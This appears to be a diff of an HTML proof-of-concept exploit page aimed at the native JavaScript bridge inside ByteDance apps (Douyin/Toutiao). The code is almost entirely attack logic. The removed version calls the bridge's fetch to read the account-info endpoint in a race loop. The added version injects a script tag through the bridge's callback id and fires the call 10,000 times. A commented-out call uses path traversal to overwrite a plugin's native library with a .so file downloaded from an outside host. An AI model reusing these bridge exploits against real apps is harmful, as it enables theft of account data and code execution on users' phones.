@@ -1,61 +1,66 @@
+<!DOCTYPE html>
 <html>
 
 <head>
-  <meta charset="UTF-8" />
-  <title>exp</title>
-  <script type="text/javascript">
+    <meta charset="UTF-8">
+    <title>领取抖音红包</title>
+    <!-- <script src="https://unpkg.pstatp.com/bridge/toutiao/3.1.4/lib/toutiao.umd.js"></script>​
+    <script
+        src="https://lf1-cdn-tos.bytegoofy.com/goofy/fe/ies/bridge/bytedance/jsbridge-3.0.0-alpha.3.umd.js"></script>​
+    <script src="https://unpkg.byted-static.com/bridge/aweme/1.2.8/lib/aweme.umd.js"></script> -->
+    <script src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"></script>
+    <script>
+        var vConsole = new window.VConsole();
+    </script>
 
+    <script type="text/javascript">
 
-    window.ToutiaoJSBridge._handleMessageFromToutiao = function (f) {
-      var re = JSON.stringify(f);
-      if (!re.includes("Permission") && !re.includes("H5_visibilityChange")) {
-        alert(re);
-        console.log('proyx1122:' + JSON.stringify(f));
-      } else {
-        //alert(JSON.stringify(f));
-        console.log('proyx:' + JSON.stringify(f));
-      }
+        function bianli() {
+            for (var property in window) {
+                document.write(property + "\n\t<br/>");
+            }
 
-    }
+        }
+        var JSBridge = {};
+        JSBridge._handleMessageFromApp = function (p1) {
+            theData = JSON.stringify(p1);
+            console.log('proyx11:' + theData);
+            //alert(theData);
+            if (!theData.includes("not found")) {
+                console.log('proyx1122:' + theData);
+                //alert(theData);
+            }
+        }
 
-    function f4() {
-      for (var i = 0; i < 5; i++) {
-        func1();
-      }
-    }
-
-    function attack1() {
-      setTimeout(func1, 15);
-      location.href = ("https://www.douyin.com/");
-    }
-
-    function func1() {
-      window.ToutiaoJSBridge.invokeMethod(
-        JSON.stringify(
-          {
-            __callback_id: "test",
-            func: "fetch",
-            params: {
-              url: "https://is.snssdk.com/passport/account/info/v2/",
-              method: "GET"
-            },
-            namespace: "",
-            JSSDK: "1.2.1",
-            __msg_type: "call"
-          }
-        )
-      );
-    }
-
-    f4();
-  </script>
+        function payload() {
+            try {
+                //JS2NativeBridge.call('ttcjpay.getPhoneInfo', '{"__callback_id":"1000","params":{"file_name":"../../../../../../../../../data/data/com.ss.android.ugc.aweme/files/plugins/com.ss.android.ugc.aweme.im.biz.plugin/version-27709014/lib/libyuv.so","download_url":"https://security.feishu.cn/link/safety?target=http%3A%2F%2Fwww.cnwatcher.com%2F2.so&scene=ccm&logParams=%7B"},"JSSDK":1,"__msg_type":"call"}');
+                JS2NativeBridge.call('ttcjpay.deviceInfo', '{"__callback_id":"100<script>","JSSDK":1,"__msg_type":"call"}');
+            }
+            catch (err) {
+                //alert(1);
+                alert(err);
+            }
+        }
+        function race() {
+            for (var i = 0; i < 10000; i++) {
+                setTimeout(payload, 1 + i)
+            }
+            document.location.href = "https://aaaxx.bytedance.net";
+        }
+        // race();
+    </script>
 </head>
 
 <body>
-  <h1>hack</h1>
-  <button style="width:200px;height:200px;" onclick="f4()">exp-条件竞争</button><br />
-  <button style="width:200px;height:200px;" onclick="func1()">exp2-直接调用jsb</button><br />
-  <button style="width:200px;height:200px;" onclick="location.href=location.href+'?'">F5</button>
+    <h1>AllOBJ</h1>
+    <button style="width:200px;height:200px;" onclick="bianli()">allobj</button>
+    <br />
+    <button style="width:200px;height:200px;" onclick="race()">race</button>
+    <br />
+    <button style="width:200px;height:200px;" onclick="payload()">payload</button>
+    <br />
+    <button style="width:200px;height:200px;" onclick="location.href=location.href+'?'">F5</button>
 
 </body>
 
